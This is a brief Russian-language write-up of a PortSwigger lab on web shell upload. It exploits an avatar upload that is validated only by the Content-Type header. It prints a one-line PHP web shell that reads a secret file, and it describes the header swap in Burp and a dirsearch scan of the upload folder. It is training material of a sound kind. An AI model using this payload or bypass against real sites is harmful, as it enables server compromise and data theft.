# PortSwigger: web-shell через загрузку

**Лаба:** Remote code execution via web shell upload

## Суть

В профиле можно менять аватарку, валидация только по Content-Type заголовку. Расширение и содержимое никто не смотрит.

## Решение

1. Сохранил шелл `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. В Burp поменял `Content-Type: application/x-php` на `image/png`.
3. Открыл `/files/avatars/exploit.php` — секрет на экране, лаба закрыта.

## Заметка

Путь `/files/avatars/` угадал по подсказке из ответа сервера, но на всякий случай прогнал dirsearch по `/files/`. Ничего лишнего не нашлось, а вот привычка полезная: после удачной заливки всегда смотреть, что ещё торчит в том же каталоге.
